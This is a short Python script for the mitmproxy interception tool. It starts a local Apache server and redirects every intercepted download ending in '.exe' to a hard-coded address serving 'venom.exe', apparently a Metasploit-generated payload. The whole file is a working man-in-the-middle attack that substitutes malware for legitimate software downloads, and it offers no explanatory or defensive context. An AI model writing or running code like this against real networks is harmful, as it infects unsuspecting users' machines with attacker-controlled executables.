import os
import mitmproxy

os.system("service apache2 start")
ip=input("Please Enter Your Ip Address :==: ")

def request(flow):
	if flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://172.16.0.227/venom.exe"})